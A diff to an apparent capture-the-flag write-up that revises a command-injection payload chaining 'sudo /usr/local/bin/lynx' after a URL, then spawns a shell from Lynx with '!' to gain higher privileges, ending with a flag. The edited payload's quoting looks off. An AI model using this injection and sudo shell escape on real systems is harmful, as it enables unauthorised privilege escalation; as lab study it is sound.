@@ -149,7 +149,7 @@ By entering `/` or any directory, we can see its contents. Same goes for file://
 Let's inject the following command:
 
 ```sh
-https://example.com'; sudo /usr/local/bin/lynx; echo '
+https://example.com'; sudo /usr/local/bin/lynx'
 ```
 
 This will end up opening two instances of Lynx. Quit the first instance which is running as the `securesurfer` user. 
@@ -180,14 +180,15 @@ The solution is actually much simpler and requires just reading the tool's manua
 Run the command, quit the first instance.
 
 ```sh
-https://example.com'; sudo /usr/local/bin/lynx; echo '
+https://example.com'; sudo /usr/local/bin/lynx'
 ```
 
 Spawn shell with `!`.
 
 ![](Pasted%20image%2020240525153013.png)
 
-![](Pasted%20image%2020240525153327.png)
+![](Pasted%20image%2020240529143913.png)
+
 
 ```txt
 flag{59bcb1602f51c8cfaff5bbcf634e4574}
